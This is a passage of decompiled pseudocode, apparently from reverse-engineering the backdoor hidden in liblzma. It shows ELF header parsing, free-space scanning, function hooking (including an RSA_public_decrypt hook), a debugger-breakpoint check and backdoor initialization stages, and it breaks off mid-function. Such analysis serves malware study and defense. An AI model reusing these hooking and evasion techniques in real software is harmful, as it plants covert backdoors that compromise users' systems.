__int64 __fastcall Ldelta_coder_end_1(struct_elf_info *a1, int tre_hash)
{
  int plt_num; // edx

  if ( (a1->dt_flags & DT_NEEDED) != 0 && (plt_num = a1->plt_num) != 0 )
    return Llz_encode_1(a1, (_QWORD *)a1->JMPREL_addr, plt_num, 7LL, tre_hash);
  else
    return 0LL;
}

//----- (0000000000001E80) ----------------------------------------------------
__int64 __fastcall Ldelta_decode_part_0(__int64 a1, int a2)
{
  unsigned int v2; // edx

  if ( (*(_BYTE *)(a1 + 208) & 2) != 0 && (v2 = *(_DWORD *)(a1 + 128)) != 0 )
    return Llz_encode_1((struct_elf_info *)a1, *(_QWORD **)(a1 + 120), v2, 6LL, a2);
  else
    return 0LL;
}

//----- (0000000000001EB0) ----------------------------------------------------
unsigned __int64 __fastcall Llzma_check_update_0(__int64 a1, unsigned __int64 *a2)
{
  _BOOL4 v4; // edx
  unsigned __int64 result; // rax
  unsigned int v6; // edi
  __int64 i; // rsi
  unsigned __int64 v8; // rdx
  __int64 v9; // rcx
  __int64 v10; // rax
  unsigned __int64 v11; // rdx

  v4 = apply_one_entry_ex(0LL, 0xCBu, 7u, 0xCu);
  result = 0LL;
  if ( v4 )
  {
    result = *(_QWORD *)(a1 + 152);
    if ( result )
    {
      v8 = *(_QWORD *)(a1 + 160);
LABEL_12:
      *a2 = v8;
    }
    else
    {
      v6 = *(unsigned __int16 *)(a1 + 24);
      for ( i = 0LL; (unsigned int)i < v6; ++i )
      {
        v9 = *(_QWORD *)(a1 + 16) + 56 * i;
        if ( *(_DWORD *)v9 == 1 && (*(_BYTE *)(v9 + 4) & 1) != 0 )
        {
          v10 = *(_QWORD *)(v9 + 16) + *(_QWORD *)a1 - *(_QWORD *)(a1 + 8);
          v11 = v10 + *(_QWORD *)(v9 + 40);
          result = v10 & 0xFFFFFFFFFFFFF000LL;
          if ( (v11 & 0xFFF) != 0 )
            v11 = (v11 & 0xFFFFFFFFFFFFF000LL) + 4096;
          v8 = v11 - result;
          *(_QWORD *)(a1 + 152) = result;
          *(_QWORD *)(a1 + 160) = v8;
          goto LABEL_12;
        }
      }
    }
  }
  return result;
}

//----- (0000000000001F60) ----------------------------------------------------
unsigned __int64 __fastcall Lindex_tree_append_part_0(__int64 a1, unsigned __int64 *a2)
{
  unsigned __int64 result; // rax
  __int64 v5; // r13
  unsigned __int64 v6; // rax
  unsigned __int64 v7; // rsi
  __int64 v8; // r8
  int v9; // r9d
  unsigned __int64 v10; // rdi
  __int64 v11; // rcx
  __int64 v12; // rdx
  unsigned __int64 v13; // r11
  unsigned __int64 v14; // rdx
  unsigned __int64 v15; // rcx
  unsigned __int64 v16[4]; // [rsp+8h] [rbp-20h] BYREF

  if ( !(unsigned int)Llzma_index_iter_rewind_cold(0xBDu, 0xEu, 0xBu, 0) )
    return 0LL;
  result = *(_QWORD *)(a1 + 168);
  v5 = *(_QWORD *)a1;
  v16[0] = 0LL;
  if ( result )
  {
    *a2 = *(_QWORD *)(a1 + 176);
  }
  else
  {
    v6 = Llzma_check_update_0(a1, v16);
    if ( !v6 )
      return 0LL;
    v7 = v16[0] + v6;
    v8 = 0LL;
    v9 = 0;
    v10 = 0LL;
    result = 0LL;
    while ( (unsigned int)v8 < *(unsigned __int16 *)(a1 + 24) )
    {
      v11 = *(_QWORD *)(a1 + 16) + 56 * v8;
      if ( *(_DWORD *)v11 == 1 && (*(_DWORD *)(v11 + 4) & 7) == 4 )
      {
        v12 = *(_QWORD *)(v11 + 16) + v5 - *(_QWORD *)(a1 + 8);
        v13 = v12 + *(_QWORD *)(v11 + 40);
        v14 = v12 & 0xFFFFFFFFFFFFF000LL;
        v15 = v13;
        if ( (v13 & 0xFFF) != 0 )
          v15 = (v13 & 0xFFFFFFFFFFFFF000LL) + 4096;
        if ( v14 >= v7 )
        {
          if ( v9 )
          {
            if ( v14 < result )
            {
              result = v14;
              v10 = v15 - v14;
            }
          }
          else
          {
            result = v14;
            v9 = 1;
            v10 = v15 - v14;
          }
        }
      }
      ++v8;
    }
    if ( !v9 )
      return 0LL;
    *(_QWORD *)(a1 + 168) = result;
    *(_QWORD *)(a1 + 176) = v10;
    *a2 = v10;
  }
  return result;
}
// 1F60: using guessed type unsigned __int64 var_20[4];

//----- (0000000000002090) ----------------------------------------------------
char *__fastcall Llzip_decode_0(__int64 a1, unsigned int *a2, char *a3)
{
  char *v4; // rbx
  unsigned __int64 appended; // rax
  unsigned __int64 v6; // r12
  unsigned int v7; // eax
  unsigned __int64 v9[6]; // [rsp+8h] [rbp-30h] BYREF

  if ( (unsigned int)Llzma_index_iter_rewind_cold(0xB6u, 7u, 0xAu, 0) )
  {
    v9[0] = 0LL;
    appended = Lindex_tree_append_part_0(a1, v9);
    v4 = (char *)appended;
    if ( appended )
    {
      if ( v9[0] > 0x2B )
      {
        v6 = appended + v9[0];
        if ( !a3 )
          goto LABEL_12;
        if ( (unsigned __int64)a3 < v6 )
        {
          if ( appended < (unsigned __int64)a3 )
            v4 = a3;
LABEL_12:
          while ( (unsigned __int64)v4 < v6 )
          {
            v7 = (unsigned int)table_get(v4, v6);
            if ( v7 )
            {
              if ( !*a2 )
              {
                *a2 = v7;
                return v4;
              }
              if ( *a2 == v7 )
                return v4;
            }
            ++v4;
          }
        }
      }
    }
  }
  return 0LL;
}
// 2090: using guessed type unsigned __int64 var_30[6];

//----- (0000000000002140) ----------------------------------------------------
__int64 __fastcall maybe_find_freespaces(struct_elf_info *a1, unsigned __int64 *a2, int a3)
{
  __int64 phdr_file_end; // rax
  Elf64_Ehdr *elf_hdr; // r9
  __int64 i; // r10
  int found; // r11d
  unsigned __int64 v9; // r12
  unsigned __int64 v10; // rbx
  __int64 v11; // rdx
  elf64_phdr *phdr; // rdx
  Elf64_Xword p_memsz; // r15
  __int64 v14; // r8
  unsigned __int64 v15; // r15
  unsigned __int64 v16; // rdx
  elf64_phdr *phdr_1; // rax
  __int64 phdr_start; // rdx
  unsigned __int64 phdr_mem_end; // r8
  unsigned __int64 mem_end_align_up; // rdx
  unsigned __int64 mem_end_align_up2; // r9
  __int64 free_size; // rdx
  __int64 free_size_wbss; // r9

  phdr_file_end = a1->rw_hdr_file_end;
  elf_hdr = a1->elf_hdr;
  if ( phdr_file_end )
  {
    if ( a3 )
    {
      v11 = a1->total_free;
      *a2 = v11;
      phdr_file_end -= v11;
      if ( !v11 )
        return 0LL;
    }
    else
    {
      *a2 = a1->total_free_wbss;
    }
  }
  else
  {
    i = 0LL;
    found = 0;
    v9 = 0LL;
    v10 = 0LL;
    while ( (unsigned int)i < (unsigned __int16)a1->phnum )
    {
      phdr = &a1->phdr_base[i];
      if ( phdr->__p_type == PT_LOAD && (phdr->p_flags & 7) == 6 )// RW
      {
        p_memsz = phdr->p_memsz;
        if ( p_memsz < phdr->p_filesz )
          return 0LL;
        v14 = (__int64)&elf_hdr->e_ident[phdr->p_vaddr - a1->last_va];
        v15 = v14 + p_memsz;
        v16 = v14 & 0xFFFFFFFFFFFFF000LL;
        if ( (v15 & 0xFFF) != 0 )
          v15 = (v15 & 0xFFFFFFFFFFFFF000LL) + 4096;
        if ( found )
        {
          if ( v10 + v9 < v15 )
          {
            v10 = v14 & 0xFFFFFFFFFFFFF000LL;
            LODWORD(phdr_file_end) = i;
            v9 = v15 - v16;
          }
        }
        else
        {
          v10 = v14 & 0xFFFFFFFFFFFFF000LL;
          LODWORD(phdr_file_end) = i;
          found = 1;
          v9 = v15 - v16;
        }
      }
      ++i;
    }                                           // Find the last RW phdr, store the index to result
    if ( !found )
      return 0LL;
    phdr_1 = &a1->phdr_base[(unsigned int)phdr_file_end];
    phdr_start = (__int64)&elf_hdr->e_ident[phdr_1->p_vaddr - a1->last_va];
    phdr_mem_end = phdr_start + phdr_1->p_memsz;
    phdr_file_end = phdr_1->p_filesz + phdr_start;
    mem_end_align_up = phdr_mem_end;
    if ( (phdr_mem_end & 0xFFF) != 0 )
      mem_end_align_up = (phdr_mem_end & 0xFFFFFFFFFFFFF000LL) + 4096;
    mem_end_align_up2 = mem_end_align_up;
    free_size = mem_end_align_up - phdr_mem_end;
    a1->rw_hdr_file_end = phdr_file_end;
    free_size_wbss = mem_end_align_up2 - phdr_file_end;
    a1->total_free = free_size;
    a1->total_free_wbss = free_size_wbss;
    if ( !a3 )                                  // if a3 == 0, use bss free spaces
    {
      *a2 = free_size_wbss;
      return phdr_file_end;
    }
    *a2 = free_size;                            // otherwise use secure data spaces
    if ( !free_size )
      return 0LL;
    return phdr_mem_end;
  }
  return phdr_file_end;
}

//----- (00000000000022C0) ----------------------------------------------------
__int64 __fastcall Lauto_decode_1(struct_elf_info *a1, unsigned __int64 a2, unsigned __int64 a3, int a4)
{
  __int64 result; // rax
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rcx
  unsigned __int64 v10; // rdx
  bool v11; // si

  result = process_elf_seg(a1, a2, a3, 2LL);
  if ( (_DWORD)result )
  {
    result = 1LL;
    if ( a4 )
    {
      if ( a1->relo_found )
      {
        v8 = (unsigned __int64)&a1->elf_hdr->e_ident[a1->relo_vaddr - a1->last_va];
        v9 = v8 + a1->relo_size;
        v10 = v8 & 0xFFFFFFFFFFFFF000LL;
        if ( (v9 & 0xFFF) != 0 )
          v9 = (v9 & 0xFFFFFFFFFFFFF000LL) + 4096;
        v11 = a2 >= v10;
        if ( a2 >= v9 )
          return v9 < a3 + a2 || !v11 && v10 >= a3 + a2;
        result = 0LL;
        if ( a2 < v10 )
          return v9 < a3 + a2 || !v11 && v10 >= a3 + a2;
      }
    }
  }
  return result;
}

//----- (0000000000002360) ----------------------------------------------------
__int64 __fastcall Lhc_find_func_1(unsigned __int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v4; // rbx
  __int64 v6; // rax
  int (__fastcall *v7)(__int64, _QWORD, _QWORD, _QWORD, __int64 *, unsigned __int64); // rax
  _DWORD *v8; // rax
  __int64 v9[7]; // [rsp+0h] [rbp-38h] BYREF

  if ( !a2 )
    return 0LL;
  if ( a1 <= 0xFFFFFF )
    return 0LL;
  v4 = a1 & 0xFFFFFFFFFFFFF000LL;
  if ( (a1 & 0xFFFFFFFFFFFFF000LL) < a1 + a2 )
  {
    v9[0] = 0LL;
    if ( a3 )
    {
      while ( 1 )
      {
        v6 = *(_QWORD *)(a3 + 16);
        if ( !v6 )
          break;
        if ( !*(_QWORD *)(v6 + 80) )
          break;
        v7 = *(int (__fastcall **)(__int64, _QWORD, _QWORD, _QWORD, __int64 *, unsigned __int64))(v6 + 64);
        if ( !v7 )
          break;
        v9[1] = 1LL;
        if ( v7(1LL, 0LL, 0LL, 0LL, v9, v4) < 0 )
        {
          v8 = (_DWORD *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a3 + 16) + 80LL))(1LL);
          if ( *v8 == 14 || !v4 )
          {
            *v8 = 0;
            return 0LL;
          }
        }
        v4 += 4096LL;
        if ( v4 >= a1 + a2 )
          return 1LL;
        v9[0] = 0LL;
      }
    }
    return 0LL;
  }
  return 1LL;
}

//----- (0000000000002430) ----------------------------------------------------
__int64 __fastcall j_tls_get_addr(__int64 a1)
{
  return _tls_get_addr(a1);
}
// CB70: using guessed type __int64 __fastcall _tls_get_addr(_QWORD);

//----- (0000000000002480) ----------------------------------------------------
char *get_lzma_allocator_addr()
{
  unsigned int i; // [rsp+1Ch] [rbp-Ch]
  __int64 v2; // [rsp+20h] [rbp-8h]

  v2 = (__int64)Llookup_filter_part_0;
  for ( i = 0; i <= 11; ++i )
    v2 += 32LL;
  return (char *)v2;
}
// CAE8: using guessed type __int64 *Llookup_filter_part_0;

//----- (00000000000024E0) ----------------------------------------------------
struc_Lencoder *__fastcall get__Lencoder_1_addr()
{
  unsigned int i; // [rsp+1Ch] [rbp-Ch]
  __int64 v2; // [rsp+20h] [rbp-8h]

  v2 = (__int64)Lfilter_optmap_0;
  for ( i = 0; i <= 0xB; ++i )
    v2 += 0x38LL;
  return (struc_Lencoder *)v2;                  // return _Lencoder_1
}
// CAE0: using guessed type __int64 *Lfilter_optmap_0;

//----- (0000000000002540) ----------------------------------------------------
__int64 __fastcall sub_2540(_QWORD *a1, __int64 a2, struct_elf_info *a3, __int64 a4)
{
  struct lzma_allocator *lzma_allocator; // rax
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // r14
  __int64 v10; // rax
  unsigned __int64 v12; // r9
  __int64 *v13; // rdi
  __int64 v14; // rcx
  unsigned __int64 v15; // r13
  char *str; // rax
  unsigned __int64 v17; // r9
  unsigned __int8 *v18; // rax
  __int64 v19; // r13
  int v20; // eax
  unsigned __int64 v21; // rax
  int v22; // eax
  char *v23; // rax
  struct lzma_allocator *v24; // [rsp+0h] [rbp-B8h]
  __int64 v25; // [rsp+8h] [rbp-B0h]
  unsigned __int64 v26; // [rsp+10h] [rbp-A8h]
  unsigned __int64 v28; // [rsp+28h] [rbp-90h]
  unsigned __int64 v29; // [rsp+28h] [rbp-90h]
  unsigned __int64 v30; // [rsp+30h] [rbp-88h] BYREF
  __int64 v31; // [rsp+38h] [rbp-80h] BYREF
  __int64 v32; // [rsp+40h] [rbp-78h]
  char v33; // [rsp+49h] [rbp-6Fh]
  char v34; // [rsp+53h] [rbp-65h]
  int v35; // [rsp+54h] [rbp-64h]
  int v36; // [rsp+60h] [rbp-58h]
  __int64 v37; // [rsp+68h] [rbp-50h]

  v30 = 0LL;
  lzma_allocator = get_lzma_allocator(1LL);
  lzma_allocator->elf_info = a3;
  v24 = lzma_allocator;
  v7 = Llzma_check_update_0(a2, &v30);
  if ( v7 )
  {
    v8 = v7;
    v9 = v7 + v30;
    v10 = lzma_alloc(1880LL, v24);
    *(_QWORD *)(a4 + 112) = v10;
    if ( v10 )
      ++*(_DWORD *)(a4 + 288);
    v25 = Ldelta_decode_part_0(a2, 552);
    if ( v25 )
    {
      v12 = *(_QWORD *)(*(_QWORD *)a2 + 24LL) + *(_QWORD *)a2;
      if ( v12 < v9 && v12 >= v8 )
      {
        v13 = &v31;
        v14 = 22LL;
        v28 = *(_QWORD *)(*(_QWORD *)a2 + 24LL) + *(_QWORD *)a2;
        v15 = v12 + 512;
        if ( v9 <= v12 + 512 )
          v15 = v9;
        while ( v14 )
        {
          *(_DWORD *)v13 = 0;
          v13 = (__int64 *)((char *)v13 + 4);
          --v14;
        }
        v26 = v15;
        str = import_lookup_get_str(a3, 0xF8, 0);// EVP_Digest
        v17 = v28;
        if ( str )
        {
          v18 = &a3->elf_hdr->e_ident[*((_QWORD *)str + 1)];
          ++*(_DWORD *)(a4 + 288);
          *(_QWORD *)(a4 + 240) = v18;
        }
        v19 = 0LL;
        while ( v17 < v26 )
        {
          v29 = v17;
          if ( (unsigned int)code_dasm(&v31, v17, v26) )
          {
            if ( v36 == 269 )
            {
              if ( (v34 & 0x48) == 72 )
              {
                v20 = v35;
                LOBYTE(v20) = 0;
                if ( v20 == 84344832 )
                {
                  v21 = v37 + v32 + v31;
                  if ( v21 >= v8 && v21 < v9 )
                    v19 = v37 + v32 + v31;
                }
              }
            }
            else if ( v19 )
            {
              if ( v36 == 383 )
              {
                v22 = v35;
                LOBYTE(v22) = 0;
                if ( v22 == 84017152 && (v33 & 1) != 0 && v25 == v32 + v31 + v37 )
                {
                  v23 = import_lookup_get_str(a3, 3168, 0);
                  if ( v23 )
                  {
                    *(_QWORD *)(a4 + 88) = (char *)a3->elf_hdr + *((_QWORD *)v23 + 1);
                    ++*(_DWORD *)(a4 + 288);
                  }
                  *a1 = v19;
                  return 1LL;
                }
              }
            }
            v17 = v32 + v29;
          }
          else
          {
            v17 = v29 + 1;
          }
        }
      }
    }
    lzma_free(*(_QWORD *)(a4 + 112), v24);
  }
  return 0LL;
}
// CB78: using guessed type __int64 __fastcall lzma_free(_QWORD, _QWORD);
// CB80: using guessed type __int64 __fastcall lzma_alloc(_QWORD, _QWORD);

//----- (0000000000002760) ----------------------------------------------------
void __fastcall sub_2760(__int64 a1)
{
  _DWORD *v1; // rax
  _QWORD *v2; // rdx
  _DWORD *v3; // rax
  _BYTE *v4; // rax
  _DWORD *v5; // rax
  _QWORD *v6; // rax

  if ( a1 )
  {
    v1 = *(_DWORD **)(a1 + 64);
    if ( v1 )
    {
      *v1 = *(_DWORD *)(a1 + 72);
      v2 = *(_QWORD **)(a1 + 248);
      if ( v2 )
        *v2 = v1;
    }
    v3 = *(_DWORD **)(a1 + 80);
    if ( v3 )
      *v3 = *(_DWORD *)(a1 + 88);
    v4 = *(_BYTE **)(a1 + 96);
    if ( v4 )
      *v4 &= ~*(_BYTE *)(a1 + 104);
    v5 = *(_DWORD **)(a1 + 120);
    if ( v5 )
      *v5 = 0;
    v6 = *(_QWORD **)(a1 + 112);
    if ( v6 )
      *v6 = 0LL;
  }
}

//----- (00000000000027C0) ----------------------------------------------------
__int64 __fastcall backdoor_vtbl_init(struc_vtbl *a1)
{
  __int64 result; // rax

  result = 5LL;
  if ( a1 )
  {
    a1->field_38 = (__int64)&Lfilter_options_0;
    result = 0LL;
    if ( !a1->static_gots )
    {
      a1->field_68 = 4LL;
      a1->field_40 = (__int64)func_name_match;
      a1->field_48 = (__int64)Llzma_index_prealloc_0;
      a1->field_50 = (__int64)RSA_public_decrypt_hooker;
      a1->field_58 = (__int64)&Llzma12_mode_map_part_1;
      a1->field_70 = (__int64)Lfile_info_decode_0;
      a1->field_78 = (__int64)Lbt_skip_func_part_0;
      return 101LL;
    }
  }
  return result;
}
// 80B0: using guessed type __int64 __fastcall Lbt_skip_func_part_0();
// 8ED0: using guessed type __int64 __fastcall Lfile_info_decode_0();
// A270: using guessed type __int64 __fastcall Llzma_index_prealloc_0();
// A360: using guessed type __int64 __fastcall Llzma_index_init_0();
// CB50: using guessed type __int64 Lfilter_options_0;

//----- (0000000000002840) ----------------------------------------------------
__int64 __fastcall Llzma_delta_props_decode_part_0(__int64 (__fastcall **a1)(__int64 a1, int a2, __int64 a3))
{
  __int64 result; // rax

  result = 5LL;
  if ( a1 )
  {
    *a1 = Llzma_code_part_1;
    a1[1] = (__int64 (__fastcall *)(__int64, int, __int64))Llzma_index_memusage_part_0;
    a1[2] = (__int64 (__fastcall *)(__int64, int, __int64))&global_ctx;
    return 0LL;
  }
  return result;
}
// A300: using guessed type __int64 __fastcall Llzma_index_memusage_part_0();
// CB58: using guessed type __int64 global_ctx;

//----- (0000000000002880) ----------------------------------------------------
__int64 __fastcall sub_2880(struc_2880 *a1)
{
  __int64 result; // rax

  if ( a1->field_120 != 29 )
    return 0LL;
  result = 1LL;
  if ( !a1->backdoor_init_stage2 && !a1->field_20 && !a1->field_28 )
  {
    a1->backdoor_init_stage2 = (__int64)backdoor_init_stage2;
    a1->field_28 = (__int64)Llzma_delta_props_decode_part_0;
    return 0LL;
  }
  return result;
}

//----- (00000000000028C0) ----------------------------------------------------
__int64 __fastcall func_name_match(unsigned __int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, char *a6)
{
  __int64 v6; // r12
  _QWORD *v7; // r13
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // r15
  unsigned int v10; // eax
  _QWORD *v11; // rdx
  __int64 v12; // rax
  _QWORD *v13; // rdx
  __int64 v14; // rax
  _QWORD *v15; // rax
  bool v16; // cc
  _QWORD *v17; // rcx
  __int64 v18; // rax
  char *retaddr; // [rsp+28h] [rbp+0h]

  v6 = Lfilter_options_0;
  v7 = *(_QWORD **)(Lfilter_options_0 + 296);
  if ( !*(_DWORD *)(Lfilter_options_0 + 304) )
  {
    v8 = *(_QWORD *)(Lfilter_options_0 + 256);
    v9 = *(_QWORD *)(global_ctx->field_10 + 104);
    if ( v8 >= (unsigned __int64)retaddr || *(_QWORD *)(Lfilter_options_0 + 264) + v8 < (unsigned __int64)&retaddr[-v8] )
      goto LABEL_28;
    v10 = (unsigned int)table_get(a6, 0LL);
    v11 = (_QWORD *)v7[3];
    if ( v10 == 464 && v11 )
    {
      if ( *v11 > 0xFFFFFFuLL )
      {
        *v7 = *v11;
        v12 = *(_QWORD *)(v6 + 272);
        *v11 = v12;
        if ( a1 > (unsigned __int64)retaddr && a1 < v9 )
          *(_QWORD *)(a1 + 8) = v12;
      }
      goto LABEL_27;
    }
    v13 = (_QWORD *)v7[4];
    if ( v13 && v10 == 1296 )
    {
      if ( *v13 <= 0xFFFFFFuLL )
        goto LABEL_27;
      v7[1] = *v13;
      v14 = *(_QWORD *)(v6 + 280);
      *v13 = v14;
      if ( a1 > (unsigned __int64)retaddr && a1 < v9 )
        *(_QWORD *)(a1 + 8) = v14;
      v15 = (_QWORD *)v7[5];
      if ( !v15 )
        goto LABEL_27;
      v16 = *v15 <= 0xFFFFFFuLL;
    }
    else
    {
      v17 = (_QWORD *)v7[5];
      if ( v10 != 1944 || !v17 )
        return *(_QWORD *)(a1 + 8);
      if ( *v17 <= 0xFFFFFFuLL )
        goto LABEL_27;
      v7[2] = *v17;
      v18 = *(_QWORD *)(v6 + 288);
      *v17 = v18;
      if ( a1 > (unsigned __int64)retaddr && a1 < v9 )
        *(_QWORD *)(a1 + 8) = v18;
      if ( !v13 )
        goto LABEL_27;
      v16 = *v13 <= 0xFFFFFFuLL;
    }
    if ( !v16 )
    {
LABEL_27:
      sub_2760(v6, 0LL);
LABEL_28:
      *(_DWORD *)(v6 + 304) = 1;
    }
  }
  return *(_QWORD *)(a1 + 8);
}
// 2760: using guessed type __int64 __fastcall sub_2760(_QWORD, _QWORD);
// CB50: using guessed type __int64 Lfilter_options_0;

//----- (0000000000002A40) ----------------------------------------------------
_BOOL8 __fastcall sub_2A40(unsigned int a1, _DWORD **a2, _QWORD *a3, __int64 *a4, __int64 *a5, __int64 a6, _DWORD *a7)
{
  __int64 v8; // r9
  _DWORD *v9; // rdx
  __int64 updated; // rax
  _BOOL8 result; // rax
  __int64 v14; // rax

  v8 = 32LL * a1 + a6;
  v9 = *(_DWORD **)(v8 + 8);
  if ( !v9 )
    return 0LL;
  *a2 = v9;
  *a3 = *(_QWORD *)(v8 + 16);
  updated = Lstream_encoder_update_0(a5, (__int64)*a2, 0LL, 0LL, 0LL);
  *a4 = updated;
  if ( !updated )
  {
    v14 = Lstream_encoder_update_1(a5, *a2, 0LL, 0LL, 0LL);
    *a4 = v14;
    if ( !v14 )
      return 0LL;
  }
  if ( !(unsigned int)Lauto_decode_1(a5, *a4 - 8, 16LL, 1LL) )
    return 0LL;
  result = 1LL;
  if ( *a7 )
    return (unsigned int)check_software_breakpoint(*a2, (__int64)(*a2 + 1), 0xE230) != 0;
  return result;
}
// 1B80: using guessed type __int64 __fastcall Lstream_encoder_update_0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 1C20: using guessed type __int64 __fastcall Lstream_encoder_update_1(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 22C0: using guessed type __int64 __fastcall Lauto_decode_1(_QWORD, _QWORD, _QWORD, _QWORD);

//----- (0000000000002B00) ----------------------------------------------------
_BOOL8 __fastcall sub_2B00(
        unsigned __int64 a1,
        unsigned __int64 a2,
        _DWORD *a3,
        unsigned __int64 a4,
        _QWORD *a5,
        int *a6)
{
  bool v7; // zf
  __int64 *v8; // rdi
  __int64 i; // rcx
  __int64 v12; // rax
  __int64 v13; // rdi
  unsigned __int64 v14; // r14
  _DWORD *v15; // rbx
  int v16; // r9d
  unsigned __int64 v19; // [rsp+20h] [rbp-88h] BYREF
  _DWORD *v20; // [rsp+28h] [rbp-80h] BYREF
  __int64 v21; // [rsp+30h] [rbp-78h]
  int v22; // [rsp+50h] [rbp-58h]
  __int64 v23; // [rsp+60h] [rbp-48h]

  v7 = a1 == a2;
  v8 = (__int64 *)&v20;
  for ( i = 22LL; i; --i )
  {
    *(_DWORD *)v8 = 0;
    v8 = (__int64 *)((char *)v8 + 4);
  }
  if ( a1 == 0 || v7 || !a2 )
    return 0LL;
  v12 = a2 - a1;
  if ( a1 >= a2 )
    v12 = a1 - a2;
  if ( v12 > 15 )
    return 0LL;
  if ( !a5[77] )
    return 0LL;
  v13 = a5[81];
  if ( !v13 )
    return 0LL;
  v14 = a5[82];
  if ( !(unsigned int)Llzma_mt_block_size_1(v13, v14, &v20) )
    return 0LL;
  v15 = v20;
  if ( (unsigned int)code_dasm(&v20, (unsigned __int64)v20 + v21, v14) )
  {
    if ( v22 == 360 )
    {
      v16 = *a6;
      v19 = 0LL;
      v15 = (_DWORD *)((char *)v20 + v23 + v21);
      apply_method_1(v15, 0LL, &v19, a3, a4, v16);
      v14 = v19;
    }
  }
  return (unsigned int)Llzma_properties_size_0(v15, v14, 0LL, 265LL, a1)
      && (unsigned int)Llzma_properties_size_0(v15, v14, 0LL, 265LL, a2) != 0;
}
// F50: using guessed type __int64 __fastcall Llzma_mt_block_size_1(_QWORD, _QWORD, _QWORD);
// 1050: using guessed type __int64 __fastcall Llzma_properties_size_0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);

//----- (0000000000002C50) ----------------------------------------------------
unsigned __int64 __fastcall sub_2C50(unsigned int a1, __int64 a2, unsigned __int64 a3, __int64 a4)
{
  __int64 v4; // r8
  __int64 v6; // rcx
  __int64 *v7; // rdi
  unsigned __int64 v8; // r13
  unsigned __int64 result; // rax
  unsigned __int64 v10; // r15
  unsigned __int64 v12; // rbx
  __int64 v13; // [rsp+8h] [rbp-80h] BYREF
  __int64 v14; // [rsp+10h] [rbp-78h]
  char v15; // [rsp+19h] [rbp-6Fh]
  char v16; // [rsp+23h] [rbp-65h]
  int v17; // [rsp+24h] [rbp-64h]
  unsigned __int64 v18; // [rsp+38h] [rbp-50h]

  v4 = 32LL * a1;
  v6 = 22LL;
  v7 = &v13;
  while ( v6 )
  {
    *(_DWORD *)v7 = 0;
    v7 = (__int64 *)((char *)v7 + 4);
    --v6;
  }
  v8 = *(_QWORD *)(a2 + v4 + 8);
  if ( v8 )
  {
    v10 = *(_QWORD *)(a2 + v4 + 16);
    v12 = a4 - 4;
    while ( v8 < v10 )
    {
      if ( (unsigned int)Llzma_properties_size_0(v8, v10, (char *)&v13, 267, 0LL) )
      {
        if ( (v16 & 0x48) != 72 )
        {
          if ( (v15 & 1) != 0 )
          {
            result = v18;
            if ( (v17 & 0xFF00FF00) == 83886080 )
              result = v14 + v13 + v18;
            if ( result >= a3 && v12 >= result )
              return result;
          }
          else if ( !a3 )
          {
            return 0LL;
          }
        }
        v8 += v14;
      }
      else
      {
        ++v8;
      }
    }
  }
  return 0LL;
}

//----- (0000000000002D20) ----------------------------------------------------
__int64 *__fastcall sub_2D20(__int64 a1, __int64 a2)
{
  int *v2; // rdx
  int i; // eax
  __int64 *v4; // rdi
  __int64 j; // rcx
  unsigned __int64 v6; // r14
  __int64 *result; // rax
  unsigned __int64 v8; // rbx
  __int64 k; // rdx
  __int64 v10; // r12
  __int64 m; // r15
  __int64 v12; // rax
  unsigned __int64 *v13; // r12
  unsigned __int64 *v14; // r15
  unsigned __int64 *v15; // rax
  unsigned __int64 v16; // rdx
  unsigned __int64 v17; // r13
  unsigned __int64 v18; // rsi
  unsigned __int64 v19; // rax
  unsigned __int64 *v20; // rdx
  unsigned __int64 v21; // rsi
  unsigned __int64 updated; // rax
  unsigned __int64 *v23; // rdx
  unsigned __int64 v24; // rcx
  int v26; // [rsp+24h] [rbp-94h] BYREF
  unsigned __int64 v27; // [rsp+28h] [rbp-90h] BYREF
  __int64 v28; // [rsp+30h] [rbp-88h] BYREF
  unsigned __int64 v29; // [rsp+38h] [rbp-80h] BYREF
  __int64 v30; // [rsp+40h] [rbp-78h]
  char v31; // [rsp+53h] [rbp-65h]
  int v32; // [rsp+54h] [rbp-64h]
  int v33; // [rsp+60h] [rbp-58h]
  __int64 v34; // [rsp+68h] [rbp-50h]
  __int64 v35; // [rsp+70h] [rbp-48h]

  v2 = (int *)a2;
  for ( i = 16; i != 232; i += 8 )
  {
    *v2 = i;
    v2 += 8;
  }
  v4 = (__int64 *)&v29;
  for ( j = 22LL; j; --j )
  {
    *(_DWORD *)v4 = 0;
    v4 = (__int64 *)((char *)v4 + 4);
  }
  v27 = 0LL;
  v28 = 0LL;
  v6 = Llzma_check_update_0(a1, &v27);
  result = (__int64 *)&v29;
  if ( !v6 || v27 <= 0x10 )
    return result;
  v8 = v6 + v27;
  for ( k = 0LL; ; k = v10 + 1 )
  {
    v26 = 0;
    v10 = Llzip_decode_0(a1, &v26, k);
    if ( !v10 )
      break;
    for ( m = 0LL; m != 864; m += 32LL )
    {
      if ( !*(_QWORD *)(a2 + m + 24) && *(_DWORD *)(a2 + m) == v26 )
      {
        v12 = Lstream_encode_1(v6, v8, v10);
        if ( v12 )
          *(_QWORD *)(a2 + m + 24) = v12;
      }
    }
  }
  v13 = (unsigned __int64 *)(a2 + 8);
  v14 = (unsigned __int64 *)(a2 + 872);
  v15 = (unsigned __int64 *)(a2 + 8);
  do
  {
    v16 = v15[2];
    if ( v16 )
    {
      if ( v16 < v6 )
        goto LABEL_20;
      if ( *v15 < v6 )
        *v15 = v6;
      if ( v6 == v16 )
      {
LABEL_20:
        if ( v15[1] - 1 >= v6 )
          v15[1] = v6;
      }
    }
    v15 += 4;
  }
  while ( v15 != v14 );
  v17 = v6;
  while ( v17 < v8 )
  {
    v18 = v17++;
    if ( (unsigned int)code_dasm(&v29, v18, v8) )
    {
      v19 = v29;
      v17 = v29 + v30;
      if ( v33 == 360 )
      {
        if ( v35 )
        {
          v19 = v30 + v35 + v29;
LABEL_37:
          if ( v19 )
          {
LABEL_38:
            if ( v6 <= v19 && v8 >= v19 )
            {
              v20 = v13;
              do
              {
                v21 = v20[2];
                if ( v21 )
                {
                  if ( v21 < v19 )
                    goto LABEL_43;
                  if ( *v20 < v19 )
                    *v20 = v19;
                  if ( v21 == v19 )
